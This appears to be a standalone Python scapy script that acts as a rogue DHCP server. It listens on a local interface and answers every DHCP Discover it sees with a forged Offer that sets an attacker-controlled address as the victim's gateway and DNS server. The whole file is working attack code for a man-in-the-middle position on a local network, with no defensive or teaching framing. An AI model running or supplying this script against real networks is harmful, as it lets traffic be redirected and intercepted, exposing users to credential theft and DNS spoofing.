#!/usr/bin/env python3
from scapy.all import *

interface = "eth0"

def rogue_dhcp(pkt):
    if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
        mac = pkt[Ether].src
        xid = pkt[BOOTP].xid

        ether = Ether(src="aa:bb:cc:dd:ee:ff", dst=mac)
        ip = IP(src="192.168.120.99", dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(op=2, yiaddr="192.168.120.200", siaddr="192.168.120.99",
                      chaddr=bytes.fromhex(mac.replace(":", "")), xid=xid)
        dhcp = DHCP(options=[("message-type", "offer"),
                             ("server_id", "192.168.120.99"),
                             ("router", "192.168.120.99"),
                             ("dns-server", "192.168.120.99"),
                             ("end")])

        pkt_offer = ether/ip/udp/bootp/dhcp
        sendp(pkt_offer, iface=interface, verbose=0)
        print(f"[+] DHCP Offer falso enviado a {mac}")

sniff(iface=interface, filter="udp and (port 67 or 68)", prn=rogue_dhcp)